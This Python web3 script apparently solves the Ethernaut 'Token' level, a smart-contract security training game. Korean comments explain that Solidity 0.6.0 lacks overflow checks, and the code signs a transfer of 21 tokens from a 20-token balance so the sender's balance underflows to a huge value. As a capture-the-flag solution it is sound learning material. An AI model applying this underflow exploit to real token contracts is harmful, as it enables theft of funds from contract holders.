from web3 import Web3
from dotenv import dotenv_values
import requests
import time
import json

# 풀이
# 1. 컨트랙트 생성 시 생성되는 사용자 잔액 정보는 총 2가지
#   1) 현재 레벨 주소의 잔액 (21000000 - 20)
#   2) 사용자 개인 잔액 (20)
# 2. 솔리디티 0.6.0 버전에서는 정수 오버플로우 취약점이 발생하는 관계로 mapping 변수 balances에서
#    데이터가 존재하는 1번 항목의 두 데이터를 이용해서 정수 오버플로우를 통해 1-2)의 계좌의 잔액을
#    변동시키면 문제 해결 가능함
# 3. 2번 작업 진행 시 transfer 함수의 입금 대상 계좌는 현재 레벨 주소로 지정하고 현재 사용자 잔액에서
#    1을 더한 21만큼의 금액을 transfer 함수에서 입금되도록 유도하면 사용자 잔액에서 오버플로우 발생함.

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x7e2d5FCC5E02cBF2b9f860052C0226104E23F9c7'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL05_ADDRESS']
USER_PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(USER_PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [
            {
                "name": "_initialSupply",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "balanceOf",
        "inputs": [
            {
                "name": "_owner",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [
            {
                "name": "balance",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x70a08231"
    },
    {
        "type": "function",
        "name": "totalSupply",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x18160ddd"
    },
    {
        "type": "function",
        "name": "transfer",
        "inputs": [
            {
                "name": "_to",
                "type": "address",
                "internalType": "address"
            },
            {
                "name": "_value",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "signature": "0xa9059cbb"
    }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

print("---- BEFORE TRANSACTION ----")

# 잔액 정보 확인
USER_BALANCE = contract.functions.balanceOf(USER_ADDRESS).call()

print(f'User Balance Information Before Attack: {USER_BALANCE}\n')

# 값을 할당하지 않은 컨트랙트를 대상으로 현재 사용자 지갑에 전송 준비
data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = contract.functions.transfer(LEVEL_ADDRESS, 21).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print("---- AFTER TRANSACTION ----")

# 잔액 정보 확인
USER_BALANCE = contract.functions.balanceOf(USER_ADDRESS).call()

print(f'User Balance Information After Attack: {USER_BALANCE}')

if USER_BALANCE > 20:
    print("Attack Successful!")
else:
    print("Attack Failed... Try Again...")
